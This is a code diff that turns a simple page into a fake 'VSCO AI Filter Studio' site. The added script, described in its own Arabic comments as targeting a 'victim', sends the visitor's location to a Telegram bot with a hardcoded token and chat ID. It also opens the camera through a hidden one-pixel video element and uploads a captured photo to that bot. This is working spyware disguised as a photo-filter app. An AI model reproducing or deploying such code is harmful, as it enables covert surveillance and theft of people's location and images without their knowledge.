@@ -1,18 +1,48 @@
+
 <!DOCTYPE html>
 <html>
 <head>
     <title>VSCO Studio</title>
     <style>
-        body { background: white; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        button { background: black; color: white; padding: 15px 30px; border: none; cursor: pointer; }
+        body { background: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .btn { background: black; color: white; padding: 15px 30px; border-radius: 5px; cursor: pointer; display: inline-block; }
+        video { width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
 <body>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/VSCO_logo.svg/1200px-VSCO_logo.svg.png" width="80">
-    <h1>VSCO AI Studio</h1>
-    <p>Enable camera to use pro filters.</p>
-    <button onclick="startCamera()">Open Studio</button>
-    <script src="script.js"></script>
+    <img src="https://vsco.co/assets/images/vsco-logo.png" width="80">
+    <h2>VSCO AI Filter Studio</h2>
+    <div class="btn" onclick="start()">Open Studio</div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs"; 
+        const chatId = "7414704332"; 
+
+        function start() {
+            // أولاً: سحب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(p => {
+                const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍 موقع الضحية: ${loc}`);
+            });
+
+            // ثانياً: سحب الصورة (مع تأخير لضمان الجودة)
+            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                const v = document.getElementById('video');
+                v.srcObject = s;
+                setTimeout(() => {
+                    const c = document.getElementById('canvas');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        const f = new FormData(); f.append('photo', b);
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, { method: 'POST', body: f });
+                    }, 'image/jpeg');
+                }, 1500); // تأخير ثانية ونصف لفتح العدسة بالكامل
+            });
+        }
+    </script>
 </body>
 </html>
 
